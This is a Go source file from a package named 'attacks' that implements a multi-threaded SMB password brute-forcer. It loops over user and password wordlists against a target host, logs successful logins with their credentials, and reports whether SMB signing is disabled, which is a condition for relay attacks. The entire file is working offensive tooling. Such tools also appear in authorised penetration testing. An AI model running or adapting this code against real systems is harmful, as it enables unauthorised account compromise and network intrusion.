package attacks

import (
    "log"
    "fmt"
    // "github.com/hirochachacha/go-smb2"
    "github.com/stacktitan/smb/smb"
    "strconv"
    // "time"
)

// type loginChan struct{
//     user string
//     pass string
//     pos int
// }

// var yellow = color.New(color.FgYellow).SprintFunc()
// var green = color.New(color.FgGreen).SprintFunc()  
// var red = color.New(color.FgRed).SprintFunc()


func work_smb(job readerChan, serverIP, serverPort string){
    fmt.Println(yellow("[attemp] ", job))
    defer wg.Done()
    port,_ := strconv.Atoi(serverPort)
    options := smb.Options{
        Host:        serverIP,
        Port:        port,
        User:        job.user,
        Domain:      "",
        Workstation: "",
        Password:    job.pass,
    }
    debug := false
    session, err := smb.NewSession(options, debug)
    if err != nil {
        // log.Println("[!]", err)
        log.Println("[x] Login failed", job.user,":", job.pass," ",job.pos)

        return
    }else{
        defer session.Close()
        // log.Println(green("[+][+] Session Connect at ",serverIP,":", serverPort," ", job.user,":", job.pass," ",job.pos))
    }
    var log_message string 
    if session.IsSigningRequired {
        log_message = fmt.Sprint("[-] Signing is required")
        
    } else {
        log_message = fmt.Sprint("[+] Signing is NOT required")
        // if session.IsAuthenticated {
        //     log.Println(green("[+][+] Session Connect at ",serverIP,":", serverPort," ", job.user,":", job.pass," ",job.pos))
        // } else {
        //     log.Println("[-] Login failed", job.user,":", job.pass," ",job.pos)
        // }
    }
    if session.IsAuthenticated {
        log.Println(log_message, green("[+][+] Session Connect at ",serverIP,":", serverPort," ", job.user,":", job.pass," ",job.pos))
    } else {
        log.Println(log_message, red("[-] Login failed", job.user,":", job.pass," ",job.pos))
    }
    

}

func Smb_attack_start(userFile, passFile, serverIP, serverPort string, n_workers int){
    if n_workers == 0{
        n_workers = 9
    }

    log.Println ("[0] Starting jobs")
    log.Println(userFile, passFile, serverIP, serverPort, n_workers)

    rchan := make(chan readerChan, n_workers)
    go read_files(userFile, passFile, rchan)
    var sem = make(chan int, n_workers)
    for i:= 0; i< n_workers; i++{
        sem <- 1
    }
    for {
        select {
        case job,ok := <- rchan:
            if !ok {
                wg.Wait()
                fmt.Println("[info] Jobs Finished")
                return
            }
            wg.Add(1)
            <-sem
            // sem <- 1
            go func(job readerChan){
                work_smb(job, serverIP, serverPort)
                sem <- 1
                // <-sem
            }(job)
        }
    }
    // firstchan := make(chan loginChan, n_workers)
    // outchan := make(chan loginChan,n_workers)
    // okchan := make(chan bool)
    // go reader_list(userFile, firstchan, okchan)
    // go reader_list2(passFile, firstchan, outchan, okchan)
    // var sem = make(chan int, n_workers)
    // for i:= 0; i< n_workers; i++{
    //     sem <- 1
    // }
    // for {
    //     select{
    //     case j,ok := <- outchan:
    //         if !ok{
    //             wg.Wait()
    //             fmt.Println("[info] jobs finisished")
    //             return
    //         }
    //         wg.Add(1)
    //         <-sem
    //         // sem <- 1
    //         go func(job loginChan){
    //             work_smb(job,serverIP, serverPort)
    //             // <- sem
    //             sem <-1
    //         }(j)
    //     }
    // }
}